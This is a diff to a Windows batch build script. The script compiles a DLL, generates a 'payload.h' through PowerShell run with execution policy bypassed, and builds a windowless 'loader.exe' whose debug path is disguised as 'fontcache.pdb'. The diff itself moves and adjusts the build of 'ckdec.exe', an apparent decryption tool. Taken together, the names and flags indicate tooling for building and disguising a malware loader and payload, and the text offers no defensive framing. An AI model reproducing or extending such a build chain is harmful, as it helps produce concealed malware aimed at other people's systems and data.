@@ -65,6 +65,12 @@ if errorlevel 1 ( echo [build] LLVM-ML FAILED & exit /b 1 )
          /BASE:0x5F000000 /GUARD:NO /MACHINE:X64 kernel32.lib crypt32.lib bcrypt.lib iphlpapi.lib
 if errorlevel 1 ( echo [build] DLL BUILD FAILED & exit /b 1 )
 
+echo [build] ckdec.exe ...
+"%CLANG_BIN%\clang-cl.exe" /nologo /O2 /MT /std:c++17 /utf-8 ^
+   src\ckdec.cpp /Fe:bin\ckdec.exe -fuse-ld=lld ^
+   /link /SUBSYSTEM:CONSOLE ole32.lib oleaut32.lib crypt32.lib
+if errorlevel 1 ( echo [build] CKDEC BUILD FAILED & exit /b 1 )
+
 echo [build] payload.h ...
 powershell -nop -exec bypass -file src\gen.ps1
 if errorlevel 1 ( echo [build] GEN FAILED & exit /b 1 )
@@ -77,12 +83,6 @@ if errorlevel 1 ( echo [build] RC FAILED & exit /b 1 )
    src\loader.cpp bin\loader.res /Fe:bin\loader.exe -fuse-ld=lld ^
    /link /SUBSYSTEM:WINDOWS /PDBALTPATH:fontcache.pdb user32.lib advapi32.lib
 if errorlevel 1 ( echo [build] LOADER BUILD FAILED & exit /b 1 )
-
-echo [build] ckdec.exe ...
-"%CLANG_BIN%\clang-cl.exe" /nologo /O2 /MT /std:c++17 /utf-8 ^
-   src\ckdec.cpp /Fe:bin\ckdec.exe -fuse-ld=lld ^
-   /link /SUBSYSTEM:CONSOLE ole32.lib oleaut32.lib
-if errorlevel 1 ( echo [build] CKDEC BUILD FAILED & exit /b 1 )
 
 echo [build] ALL OK (clang-cl)
 for %%f in (bin\ckdll.dll bin\loader.exe bin\ckdec.exe) do echo [build]   %%~nxf  %%~zf bytes
